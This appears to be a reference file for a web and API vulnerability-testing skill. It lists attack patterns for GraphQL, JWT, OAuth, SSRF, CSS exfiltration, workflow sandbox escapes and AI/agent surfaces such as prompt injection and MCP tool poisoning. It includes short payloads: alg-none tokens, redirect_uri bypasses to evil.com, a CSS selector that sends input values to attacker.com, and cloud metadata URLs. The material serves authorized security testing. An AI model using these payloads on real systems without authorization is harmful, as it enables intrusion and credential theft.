# Web & API Vulnerability Patterns

Advanced testing patterns for API-specific, GraphQL, JWT, OAuth, and specialized web attack surfaces. Reference file for the vuln-patterns skill.

## Table of Contents

- [Tech Stack Patterns](#tech-stack-patterns)
- [GraphQL](#graphql)
- [JWT (JSON Web Token)](#jwt-json-web-token)
- [OAuth 2.0 / OpenID Connect](#oauth-20--openid-connect)
- [API Rate Limiting & Resource Exhaustion](#api-rate-limiting--resource-exhaustion)
- [AI/Agent Attack Surface Routing](#aiagent-attack-surface-routing)

---

## Tech Stack Patterns

When you know the target's technology, focus your testing:

| Stack | Priority Vulns | Why |
|-------|---------------|-----|
| **Node/Express** | Prototype pollution, SSRF, NoSQL injection | Loose typing, MongoDB common |
| **PHP/Laravel** | SQL injection, file upload, deserialization | Legacy patterns, file handling |
| **Python/Django** | SSTI, SSRF, IDOR | Template engines, URL handling |
| **Ruby/Rails** | Mass assignment, IDOR, SSRF | ActiveRecord patterns, open redirect |
| **Java/Spring** | Deserialization, SSRF, XXE | XML processing, heavy serialization |
| **GraphQL** | IDOR via node queries, introspection, DoS | Query complexity, authorization gaps |
| **REST API** | IDOR, broken auth, rate limiting | Stateless design, ID exposure |
| **SPA (React/Vue/Angular)** | DOM XSS, broken access control, API abuse | Client-side rendering, exposed APIs |
| **WordPress** | Plugin vulns, SQLi, file upload | Plugin ecosystem, legacy code |
| **AWS-hosted** | SSRF → metadata, S3 misconfig, IAM issues | Cloud-specific attack surface |
| **AI/LLM features** | Prompt injection, system prompt leak, output injection, excessive agency, cross-agent privilege escalation | OWASP LLM Top 10 #1 risk; 540% increase in reports; present in 73% of production AI; CVEs in GitHub Copilot (9.6), Cursor (9.8), MS Copilot (9.3); second-order cross-agent injection in ServiceNow Now Assist |
| **AI coding IDEs** | Project file supply chain (hooks, MCP configs, env vars), extension recommendation squatting, legacy browser flaws, workspace trust bypass, pre-trust API exfiltration, unauthenticated local servers | IDEsaster: 30+ vulns, 24 CVEs; Cursor Workspace Trust disabled by default; CVE-2026-21852 pre-trust API key exfil; CVE-2026-22812 OpenCode local server RCE; 94+ Chromium CVEs affecting 1.8M devs |
| **MCP integrations** | Tool poisoning, rug pull attacks, command injection (CVE-2025-6514, CVSS 10.0), eval() epidemic, SDK cross-client leaks, WebSocket hijacking, sandbox/container escape, TypeScript type confusion, cross-system data exfiltration | 8,000+ servers exposed; 30+ CVEs in 60 days; CVE-2026-25049 TS sandbox escape; CVE-2026-27001/27002 OpenClaw sandbox+Docker escape; Adversa AI TOP 25; VulnerableMCP.info tracks CVEs |
| **Agentic AI apps** | Agent goal hijack, tool misuse, privilege escalation, memory poisoning, rogue agents, regex denylist bypass in framework shell tools | OWASP Top 10 for Agentic Applications (Dec 2025); CVE-2026-2256 MS-Agent regex bypass; Gravitee: 88% of orgs had AI agent incidents, 47% unmonitored; compounds with MCP vulns |
| **MCP protocol layer** | Token mismanagement, command injection, supply chain poisoning, tool poisoning, shadow servers, insecure data handling | OWASP MCP Top 10 (2026); 30+ CVEs in 60 days; map findings to MCP01-MCP10 |
| **LLM frameworks** | Serialization injection, unsafe deserialization, prompt cascading through streaming ops | LangGrinch (CVE-2025-68664, CVSS 9.3) in LangChain Core; test serialization paths in LangChain, LlamaIndex, Haystack |
| **Web3/Blockchain** | Reentrancy, access control, oracle manipulation, flash loan attacks | $3B+ in Web3 losses H1 2025; access control flaws caused $953.2M; OWASP Smart Contract Top 10 ranks access control #1 |
| **Hardware/IoT** | Firmware extraction, JTAG/UART access, BLE attacks, default credentials | 88% increase in hardware vulns (Bugcrowd 2025), Samsung paying up to $1M |
| **Identity/Access** | BOLA, BFLA, privilege escalation, session management, OAuth flows | Fastest growing vuln class (HackerOne 2025); organizations shifting rewards here as XSS/SQLi decline |
| **A2A protocol** | Agent identity spoofing, capability forgery, task chain poisoning, trust graph attacks | Google's Agent-to-Agent protocol: east-west traffic bypasses perimeters; 40+ academic threats identified (arXiv:2505.12490); no token lifetime limits |

---

## GraphQL

**What it is:** A query language for APIs that introduces unique attack surface beyond REST.

**Where to look:**
- `/graphql`, `/api/graphql`, `/gql` endpoints
- Introspection queries for schema discovery
- Mutation operations for state changes
- Nested queries for authorization testing

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Introspection | `{__schema{types{name,fields{name}}}}` | Full schema disclosure |
| 2 | Field suggestion | Send typos in field names | Error messages leak valid fields |
| 3 | Batching abuse | Send array of operations `[{query:...},{query:...}]` | Bypass rate limiting |
| 4 | Nested query DoS | Deeply nested relationships `{users{posts{comments{author{posts{...}}}}}}` | Server resource exhaustion |
| 5 | Authorization on nodes | Query node IDs directly: `{node(id:"BASE64_ID"){... on User{email}}}` | Access other users' data |
| 6 | Mutation IDOR | Change IDs in mutation inputs | Modify other users' resources |
| 7 | Alias-based batching | `{a:login(u:"a",p:"1") b:login(u:"a",p:"2") ...}` | Brute force via aliases |
| 8 | Directive injection | `@include`, `@skip` with tautologies | Bypass field-level auth |
| 9 | Subscription abuse | Subscribe to events you shouldn't see | Information disclosure via WebSocket |
| 10 | Fragment injection | Overlapping fragments on union types | Access fields from wrong type |

**Bypasses:**
- If introspection is disabled, try `__type(name:"User"){fields{name}}` for individual types
- Some WAFs don't inspect POST body for GraphQL — try GET with `?query=` parameter
- Use field suggestion errors to enumerate schema without introspection
- Try sending queries as `application/x-www-form-urlencoded` instead of JSON

**GraphQL CSRF via Content-Type Switching:**
- Many GraphQL endpoints accept `application/x-www-form-urlencoded` in addition to `application/json`
- Form-encoded requests are not blocked by same-origin policy — can be sent cross-origin via HTML form
- Test: submit GraphQL mutation as `POST` with `Content-Type: application/x-www-form-urlencoded` and `query=mutation{...}`
- If the endpoint accepts the form-encoded mutation without CSRF token, any mutation is exploitable cross-origin
- Severity: High if mutations include account changes, data modification, or admin actions

---

## JWT (JSON Web Token)

**What it is:** Stateless authentication tokens that can be manipulated if improperly validated.

**Where to look:**
- `Authorization: Bearer` headers
- Cookies containing base64-encoded JSON
- Any token with three dot-separated segments

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Algorithm none | Change header `alg` to `none`, remove signature | Token accepted without signature |
| 2 | Algorithm confusion | Change RS256 to HS256, sign with public key as HMAC secret | Forged token accepted |
| 3 | Weak secret | Brute-force HMAC secret (hashcat/jwt_tool) | Forge arbitrary tokens |
| 4 | Missing expiry | Check for `exp` claim | Token valid indefinitely |
| 5 | Expired token | Send expired token | Server doesn't check `exp` |
| 6 | Key ID injection | Inject `kid` header: `../../../dev/null` | Path traversal in key loading |
| 7 | JWK header injection | Embed attacker's JWK in token header | Server uses embedded key |
| 8 | Claim tampering | Change `sub`, `role`, `admin` claims | Privilege escalation |
| 9 | Token reuse | Use token after password change/logout | No token invalidation |
| 10 | Cross-service | Use token from service A on service B | Shared secret, no audience check |
| 11 | JWE-wrapped PlainJWT bypass | If target uses encrypted JWTs (JWE), wrap a PlainJWT (alg=none) inside JWE using server's RSA public key | Signature verification skipped — authenticate as any user including admin (CVE-2026-29000, pac4j-jwt, CVSS 10.0) |

**Tools:** jwt.io (decode), jwt_tool (attack), hashcat mode 16500 (crack)

---

## OAuth 2.0 / OpenID Connect

**What it is:** Authorization framework with complex redirect flows that are frequently misconfigured.

**Where to look:**
- Login flows ("Sign in with Google/GitHub/etc.")
- `/authorize`, `/callback`, `/oauth/token` endpoints
- `redirect_uri`, `state`, `code` parameters

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Open redirect via redirect_uri | Change `redirect_uri` to attacker-controlled domain | Auth code sent to attacker |
| 2 | Subdomain redirect | Set `redirect_uri` to `evil.legitimate.com` | Lax subdomain matching |
| 3 | Path traversal redirect | `redirect_uri=https://legit.com/callback/../evil` | Parser bypass |
| 4 | Missing state | Remove `state` parameter from flow | CSRF on OAuth login |
| 5 | State reuse | Replay a used `state` value | No single-use enforcement |
| 6 | Code reuse | Submit authorization code twice | No single-use enforcement |
| 7 | Scope escalation | Request `scope=admin` or add extra scopes | Elevated access granted |
| 8 | Token leakage | Check referrer headers after redirect | Token in URL fragment leaks |
| 9 | IdP confusion | Mix tokens between identity providers | Cross-IdP authentication bypass |
| 10 | PKCE downgrade | Remove `code_verifier` from token request | Server doesn't enforce PKCE |

**Bypasses for redirect_uri validation:**
- URL encoding: `%2F%2Fevil.com`
- Parameter pollution: `redirect_uri=legit.com&redirect_uri=evil.com`
- Fragment: `redirect_uri=legit.com%23@evil.com`
- Subdomain: `redirect_uri=legit.com.evil.com`
- Path: `redirect_uri=legit.com/callback/../../evil`

---

## API Rate Limiting & Resource Exhaustion

**What it is:** Abusing insufficient rate limiting or resource controls on API endpoints.

**Where to look:**
- Authentication endpoints (login, password reset, 2FA)
- Search and data export endpoints
- Any endpoint that triggers expensive operations

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | No rate limit | Rapid-fire requests to login endpoint | No blocking or throttling |
| 2 | Header bypass | Add `X-Forwarded-For: 127.0.0.1` to reset rate counter | Rate limit bypassed |
| 3 | Case variation | Alternate `user@email.COM` and `user@email.com` | Different rate limit buckets |
| 4 | Endpoint variation | Try `/api/v1/login` vs `/api/v2/login` | Per-path rate limiting |
| 5 | IP rotation bypass | Add varying `X-Originating-IP`, `X-Remote-IP` headers | Trust in client headers |
| 6 | Null byte bypass | Append `%00` to parameters | Different rate limit key |
| 7 | Regex DoS | Send crafted input to regex-heavy endpoints | Response time spike (ReDoS) |
| 8 | Pagination abuse | Request `?page_size=999999` | Full database dump |
| 9 | Parallel requests | Send concurrent requests before rate limit kicks in | Race window exploitation |
| 10 | API key enumeration | Iterate API keys on validation endpoint | No rate limit on key checking |

---

## AI/Agent Attack Surface Routing

The following AI/agent-specific test patterns are maintained in the **ai-mcp-vulns.md** reference to avoid duplication. Load that file when testing these surfaces:

| Attack Surface | Patterns | Reference |
|---|---|---|
| **Agentic Browser Hijacking** | Zero-click agent trigger, file system exfil, credential manager access, extension escalation | `ai-mcp-vulns.md` → Agentic Browser Hijacking |
| **MCP OAuth Bypass** | Missing state param, auth code replay, redirect URI bypass, role confusion | `ai-mcp-vulns.md` → MCP OAuth |
| **AI IDE Configuration** | Workspace trust bypass, rules file backdoor, extension squatting, MCP config injection | `ai-mcp-vulns.md` → AI IDE Configuration |
| **ContextCrush / Doc Supply Chain** | Custom rules injection, library doc poisoning, RAG poisoning, env file exfil | `ai-mcp-vulns.md` → ContextCrush |

For full AI/LLM hunting methodology, see the **ai-hunting** skill.

---

## n8n / Workflow Automation Sandbox Escapes

**What it is:** Exploiting sandbox bypass vulnerabilities in workflow automation platforms (n8n, Make, Zapier) that allow code execution beyond intended boundaries.

**Where to look:**
- Expression evaluation engines in workflow automation tools
- Code node implementations (JavaScript, Python)
- Merge/transform nodes with SQL capabilities
- Git integration nodes
- Any workflow tool allowing user-defined expressions

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | JavaScript `with` statement bypass | Use the deprecated `with` statement to access blocked constructors | Sandbox blocking `constructor.constructor` but allowing `with` statement access (CVE-2026-1470, CVSS 9.9) |
| 2 | TypeScript type confusion | Use destructuring syntax that TypeScript type annotations don't enforce at runtime | Sanitization bypassed because runtime types differ from declared types (CVE-2026-25049, CVSS 9.4) |
| 3 | Python code node escape | In workflow tools with Python execution nodes, test for arbitrary Python execution | Full Python execution on "Internal" configuration instances (CVE-2026-0863, CVSS 8.5) |
| 4 | SQL Query mode file write | In merge/transform nodes with SQL mode, test for arbitrary file system operations | File write outside intended directories via crafted SQL expressions (CVE-2026-25056, CVSS 9.4) |
| 5 | Git Node code injection | In workflow tools with Git integrations, inject code via Git operations | RCE on both self-hosted and cloud instances via Git Node (CVE-2026-21877) |
| 6 | Content-Type confusion | Send requests with unexpected Content-Type to webhook/trigger endpoints | Unauthenticated RCE via Content-Type confusion in form handling (CVE-2026-21858 Ni8mare, CVSS 10.0) |
| 7 | Public webhook + expression chain | Access public-facing webhook endpoint and inject expressions that escape the sandbox | Unauthenticated system command execution via single line of JS (CVE-2026-25049) |
| 8 | Destructuring-based sanitization bypass | Use ES6 destructuring to access blocked objects through reassignment | Bypass of `__proto__` and constructor blocks via destructuring syntax |

**Key principle:** Workflow automation platforms are high-value targets because: (a) they often have public webhook endpoints, (b) expression engines run user-controlled code in sandboxes with known bypass techniques, (c) n8n alone had 8 CVEs in January-February 2026 affecting ~100K instances.

**Tools:** n8n Community Edition (self-hosted for testing), Burp Suite for webhook fuzzing, custom JavaScript payloads for sandbox probing.

---

## CSS-Only Data Exfiltration (CSP Bypass)

**What it is:** Using CSS features (`@import` chaining, `@property` registration, `paint()` worklets) to exfiltrate data without JavaScript — defeating most Content Security Policy configurations.

**Key CVE:** CVE-2026-2441 (Chrome, CVSS 8.8) — actively exploited before patch. Use-after-free in CSS parsing exploited via `@import` chaining with server-side redirect mechanism. Chrome re-evaluated selectors against DOM without full page reload.

**Where to look:**
- Applications relying on CSP to prevent XSS data exfiltration
- Pages with user-controlled CSS (custom themes, style injections, CSS-in-JS)
- Targets where JavaScript-based XSS is blocked but CSS injection is possible

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | CSS `@import` chain | Inject `@import url()` pointing to attacker-controlled server with redirects | Server receives requests with leaked data in URL parameters |
| 2 | `@property` + `paint()` | Register custom CSS property and worklet; check if compositor thread handles memory safely | Crash or unexpected behavior indicating UAF |
| 3 | Attribute selector exfiltration | Use `input[value^="a"] { background: url(attacker.com/?char=a) }` pattern | Character-by-character exfiltration of input values via CSS |
| 4 | CSS-only keylogging | Combine attribute selectors with `@import` to detect keypresses via style changes | Keystroke data leaked without any JavaScript |
| 5 | Font-based exfiltration | Use `@font-face` with `unicode-range` to detect specific characters on page | Selective font loading reveals page content |

**Severity Guidance:** High-Critical when CSP is the primary XSS mitigation. This bypasses JavaScript-based CSP entirely. Report as CSP bypass + data exfiltration chain. Patched in Chrome Feb 13, 2026 — test other browsers for similar issues.

---

## Node.js Permission Model & TLS Bypass

**What it is:** Exploiting flaws in Node.js's experimental permission model and TLS implementation.

**Key CVEs:**
- **CVE-2026-21636**: Permission model bypass via Unix Domain Socket connections — attackers bypass file/network access restrictions entirely
- **CVE-2026-21637**: TLS PSK/ALPN callback exceptions — uncaught exceptions in TLS callbacks cause process crashes (DoS)

**Where to look:**
- Applications running Node.js with `--experimental-permission` flag
- Services using Node.js TLS with PSK or ALPN callbacks
- Any Node.js app relying on the permission model for security boundaries

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | UDS permission bypass | Connect via Unix Domain Socket to bypass permission model restrictions | File/network access without permission grant |
| 2 | TLS PSK callback crash | Send TLS connection with crafted PSK identity that triggers exception in callback | Process crash (DoS) |
| 3 | ALPN callback exception | Connect with ALPN protocol list that triggers unhandled exception | Process crash via TLS negotiation |

**Severity Guidance:** High for permission model bypass (security boundary violation); Medium for TLS DoS (service availability). Permission model bypass is especially impactful when apps rely on it for sandboxing — test any Node.js service that uses `--experimental-permission`.

---

## Edge Framework Path Normalization Bypass

**What it is:** Exploiting URL decoding inconsistencies between routers and static file handlers in edge/serverless frameworks (Hono, Deno Fresh, etc.) to bypass middleware-based authentication.

**Key CVE:** CVE-2026-29045 (Hono, High severity) — `decodeURI` in router vs `decodeURIComponent` in `serveStatic` allows encoded slashes to bypass route-based middleware protections (e.g., `/admin/*` auth checks) while still resolving to protected filesystem paths. Fixed in v4.12.4.

**Where to look:**
- Applications using edge/serverless frameworks (Hono, Deno Fresh, Bun, Cloudflare Workers)
- Static file handlers behind authentication middleware
- Any route-based access control relying on path matching

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Encoded slash bypass | Request `/admin%2Fsecret-file` to bypass `/admin/*` middleware | Static file served without auth middleware executing |
| 2 | Double encoding | Request `/%252Fadmin/config` to bypass path-based rules | Path resolves after second decode round |
| 3 | Mixed encoding | Use `%2F` for slashes but normal characters otherwise | Router and file handler disagree on resolved path |
| 4 | Cookie attribute injection | Inject `\r\n` or `;` into cookie domain/path parameters | Session fixation or cookie poisoning (CVE-2026-29086, Hono) |
| 5 | SSE field injection | Inject CR/LF into `event`, `id`, `retry` fields of Server-Sent Events | Additional SSE fields injected into stream (CVE-2026-29085, Hono) |

**Severity Guidance:** High when path normalization bypass enables authentication bypass to protected resources. The root cause — decoder mismatch between components — is a recurring pattern across frameworks.

---

## GraphQL WebSocket Subscription Depth Bypass

**What it is:** GraphQL query depth limits enforced on HTTP queries/mutations but not on WebSocket subscriptions, allowing DoS via unbounded subscription nesting.

**Key CVE:** CVE-2026-30241 (Mercurius/Fastify, severity pending) — `queryDepth` limit not applied to WebSocket subscription operations. Allows arbitrarily deep subscription queries causing exponential data resolution. Fixed in v16.8.0.

**Where to look:**
- GraphQL APIs using Mercurius, Apollo Subscriptions, or any library with separate HTTP and WebSocket transports
- Applications with `queryDepth` or `depthLimit` configured

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | WebSocket depth bypass | Send deeply nested subscription over WebSocket that would be rejected over HTTP | Subscription accepted without depth check |
| 2 | Transport comparison | Send identical deep query over HTTP (blocked) and WebSocket (allowed) | Different enforcement per transport |
| 3 | Subscription DoS | Deeply nested subscription triggering exponential resolver calls | Server resource exhaustion, timeout, or crash |

**Severity Guidance:** High for DoS if depth limits are the only protection against query complexity attacks. Critical if subscription resolvers access sensitive data without per-field auth.

---

## SSRF via Webhook, Notification, and Import Endpoints

**What it is:** Server-Side Request Forgery through webhook URL validators, notification testers, and asset import features that perform incomplete IP validation.

**Recent CVE cluster (March 2026):**
- **CVE-2026-30832** (Soft Serve Git, CVSS 9.1): blind SSRF via LFS endpoint in repo import → full read via malicious LFS server chain
- **CVE-2026-28680** (Ghostfolio, CVSS 9.3): full-read SSRF via manual asset import → AWS IMDS credential exfiltration
- **CVE-2026-30840** (Wallos, CVSS 8.8): authenticated SSRF via notification tester endpoints
- **CVE-2026-30242** (Plane, CVSS 8.5): webhook URL serializer only checks `is_loopback`, not RFC 1918 ranges
- **CVE-2026-30834** (PinchTab, CVSS 7.5): API-accessible SSRF via `/download` endpoint

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Incomplete IP validation | Use `10.0.0.1`, `172.16.0.1`, `192.168.1.1` when only loopback is blocked | Access to internal network when only 127.0.0.1 is validated |
| 2 | Webhook URL test | Set webhook URL to `http://169.254.169.254/latest/meta-data/` | Cloud metadata accessible via webhook test |
| 3 | Notification tester | Use notification test/preview features with internal URLs | Response body or timing reveals internal service access |
| 4 | Asset import SSRF | Import asset/URL/feed from `http://internal-service:port/` | Import fetches internal resources |
| 5 | LFS/Git import chain | Configure repo with malicious LFS server pointing to internal targets | SSRF triggered during git LFS fetch operations |
| 6 | DNS rebinding | Use DNS rebinding to bypass IP validation at resolution time | Initial DNS resolves to allowed IP, subsequent resolve to internal |

**Severity Guidance:** Critical when full response read-back enables credential theft (cloud metadata, internal APIs). High for blind SSRF. The "only checks loopback" pattern is the most common validation gap — always test RFC 1918 ranges.

---

## Self-Hosted Remote Desktop Pre-Auth Attack Chains

**What it is:** Exploiting authentication bypass and SSRF vulnerabilities in self-hosted remote desktop solutions (RustDesk, Apache Guacamole, MeshCentral) that are commonly exposed to the internet.

**Key CVE cluster (RustDesk, March 5, 2026):**
- **CVE-2026-30789**: authentication bypass via session replay (Client ≤1.4.5)
- **CVE-2026-30784**: missing authorization for critical functions — privilege abuse (Server ≤1.7.5)
- **CVE-2026-30797**: missing authorization allowing API message manipulation via MitM
- **CVE-2026-30796**: cleartext transmission of sensitive information
- **CVE-2026-30791**: broken/risky cryptographic algorithm
- **Pre-auth SSRF** (Matt Andreko): unauthenticated SSRF fires before password verification, enabling internal port scanning

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Session replay | Capture and replay authentication session tokens | Access granted with replayed credentials (CVE-2026-30789) |
| 2 | Pre-auth SSRF | Send requests to internal IPs via the remote desktop service before authenticating | Internal port scan results returned before password check |
| 3 | API message manipulation | Intercept and modify API messages between client and server | Unauthorized operations executed via modified messages |
| 4 | Cleartext credential capture | Monitor traffic for unencrypted credential transmission | Credentials visible in network capture |

**Severity Guidance:** High-Critical for pre-auth chains (SSRF + session replay = full infrastructure access). Many self-hosted RustDesk instances are exposed on Shodan — scan for `rustdesk` on ports 21115-21119.

---

## Mobile Device Management Pre-Auth RCE

**What it is:** Exploiting unauthenticated endpoints in enterprise MDM/EMM platforms to achieve remote code execution. These targets are high-value because MDM servers control thousands of devices and often run with elevated privileges.

**Key CVE cluster (Ivanti EPMM, January-February 2026):**
- **CVE-2026-1281** (CVSS 9.8): pre-auth RCE via malicious HTTP GET to `/mifs/c/appstore/fob/`. Public PoC available Jan 30, 2026. Widespread automated exploitation deploying web shells, cryptominers, and backdoors within days
- **CVE-2026-1340** (CVSS 9.8): companion pre-auth RCE via `/mifs/c/aftstore/fob/` (Android File Transfer endpoint)

**Where to look:**
- Ivanti EPMM (MobileIron), ManageEngine MDM, VMware Workspace ONE, Microsoft Intune
- Any MDM management console exposed to the internet (common due to mobile device enrollment requirements)
- Search Shodan: `http.favicon.hash` for MDM platforms, `"MobileIron"`, `"/mifs/"` paths

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Unauthenticated endpoints | Fuzz MDM admin paths without credentials | Admin functions accessible pre-auth |
| 2 | File upload via enrollment | Use device enrollment endpoints to upload arbitrary files | Web shell deployment via enrollment flow |
| 3 | API version mismatch | Test legacy API versions alongside current ones | Older APIs may lack auth checks |
| 4 | SSRF via device check-in | Manipulate device check-in URLs to target internal services | Internal network access via MDM trust |

**Severity Guidance:** Critical — MDM servers manage enterprise device fleets and often have access to push configurations, install apps, and wipe devices across the entire organization. A compromised MDM server = full mobile fleet control.

---

## OAuth First-Party App Trust Abuse (ConsentFix)

**What it is:** Abusing trusted first-party application status in OAuth/SSO implementations to bypass MFA and Conditional Access policies.

**Key disclosure:** ConsentFix (Push Security, March 2026) — Azure CLI's first-party trust status allows it to obtain OAuth tokens that bypass MFA and Conditional Access entirely. Attacker phishes victim into pasting a URL containing OAuth key material.

**Where to look:**
- Microsoft Entra ID / Azure AD environments with first-party apps
- Any SSO implementation with implicitly trusted applications excluded from consent restrictions
- OAuth flows where first-party apps are exempt from security policies

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | First-party token abuse | Use first-party client IDs (e.g., Azure CLI) in OAuth flows | Token obtained without MFA/Conditional Access |
| 2 | Admin consent bypass | First-party apps excluded from admin consent restrictions | Elevated permissions granted without admin approval |
| 3 | Cross-tenant token use | Use token from first-party app flow across tenants | Token valid in unintended tenant |

**Severity Guidance:** Critical — bypasses MFA entirely. Relevant for any enterprise using Microsoft Entra ID. Maps to Fortinet CVE-2026-24858 (FortiCloud SSO auth bypass, CISA KEV) as part of a broader SSO trust model abuse pattern.

---

## HTTP/3 Race Conditions (QUICker)

**What it is:** Race condition testing extended to HTTP/3 (QUIC transport), a previously untestable attack surface.

**Tool:** QUICker — first race condition exploitation tool for HTTP/3 (academic research, ScienceDirect 2026).

**Why it matters:** Many applications migrating to HTTP/3 assumed race condition attacks only applied to HTTP/1.1 and HTTP/2. QUIC's multiplexed streams create new timing windows.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | H3 single-packet attack | Send multiple requests in a single QUIC Initial packet | Requests processed simultaneously, bypassing serialization |
| 2 | Transport comparison | Test identical race condition on HTTP/1.1, HTTP/2, and HTTP/3 | Different race windows across transports |
| 3 | Stream multiplexing abuse | Use QUIC stream multiplexing for tighter timing windows | Sub-millisecond race windows exploitable |

**Severity Guidance:** Same as equivalent HTTP/1.1-2 race conditions. The novelty is that HTTP/3-only targets previously considered immune to race conditions are now testable.

---

## Critical Infrastructure Authentication & Deserialization

**What it is:** Authentication bypass and Java deserialization RCE in network management interfaces — often CVSS 10.0 with root access.

**Recent examples:**
- **CVE-2026-20079** (Cisco Secure FMC, CVSS 10.0): authentication bypass via improper system process created at boot — allows script execution for root access
- **CVE-2026-20131** (Cisco Secure FMC, CVSS 10.0): Java deserialization RCE via crafted serialized object to management interface — unauthenticated root access
- **CVE-2026-22719** (VMware Aria Operations, CVSS 8.1): command injection during support-assisted migration — actively exploited in the wild (CISA KEV March 3, 2026); root access → full virtual infrastructure compromise
- **CVE-2026-20128/20122** (Cisco Catalyst SD-WAN Manager): actively exploited March 5, 2026 — file overwrite + privilege escalation via API; web shell activity observed
- **CVE-2026-24512** (Kubernetes ingress-nginx, CVSS 8.8): configuration injection via `rules.http.paths.path` leading to RCE and secret disclosure; **ingress-nginx project retiring March 2026** — no future patches for 50% of K8s clusters still using it
- **CVE-2026-20965** (Azure Windows Admin Center): SSO token validation failure — local admin on one managed system can pivot tenant-wide across all Azure VMs and Arc-connected systems

**Where to look:**
- Network management interfaces (firewall management, cloud orchestration, virtualization platforms)
- Java-based management consoles with serialization endpoints
- Migration/upgrade workflows with elevated privileges
- Boot-time processes that create persistent service accounts

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Boot process auth bypass | Identify services started at boot time with improper authentication initialization | Admin access without credentials via race condition or misconfigured startup sequence |
| 2 | Java deser on management interfaces | Send crafted serialized Java objects to management API endpoints (ysoserial payloads) | RCE or unexpected behavior indicating deserialization processing |
| 3 | Migration workflow injection | Test migration/upgrade endpoints for command injection in path/hostname parameters | Command execution during privileged migration operations |
| 4 | Management interface exposure | Check if management interfaces are accessible from untrusted networks | Admin consoles reachable without network segmentation |

**Severity Guidance:** Critical — these patterns consistently yield CVSS 9.8-10.0 with root/admin access. No workarounds exist for many (patching only). These are high-value targets because enterprise customers often delay patching management infrastructure.

---

## React Server Components DoS

**What it is:** Denial-of-service via specially crafted HTTP requests to Server Function endpoints in React Server Components (RSC), causing server crashes, out-of-memory exceptions, or excessive CPU usage.

**Recent examples:**
- **CVE-2026-23864** (React Server Components DoS, CVSS 7.5): multiple DoS vectors in RSC endpoints; affects Next.js and other React metaframeworks using Server Functions (January 2026)
- **CVE-2025-55182** (React2Shell, CVSS 10.0): pre-auth RCE in RSC via insecure deserialization — #1 on HackerOne; **RondoDox botnet** mass-exploiting this against IoT and web servers

**Where to look:**
- Any Next.js application using Server Actions or Server Functions
- React metaframeworks (Remix, Hydrogen, custom RSC implementations)
- Server Function endpoints exposed at `/_next/` or framework-specific paths
- Applications that upgraded to RSC without reviewing serialization boundaries

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Malformed RSC payloads | Send specially crafted HTTP requests to Server Function endpoints with oversized or malformed serialized data | Server crash, OOM error, or excessive CPU spike |
| 2 | Recursive object serialization | Craft deeply nested object structures in Server Function arguments | Memory exhaustion or stack overflow |
| 3 | Concurrent request flooding | Send multiple crafted RSC requests simultaneously | Server becomes unresponsive or crashes under load |
| 4 | Deserialization boundary test | Test if Server Function arguments are properly validated before deserialization | Unexpected code execution or type confusion |
| 5 | Version check | Verify React and Next.js versions against patched releases | Unpatched versions vulnerable to CVE-2026-23864 and CVE-2025-55182 |

**Severity Guidance:** DoS vectors are typically Medium-High (CVSS 7.5). Deserialization-to-RCE vectors are Critical (CVSS 10.0). The React2Shell pattern remains actively exploited — verify patching status on any Next.js target.
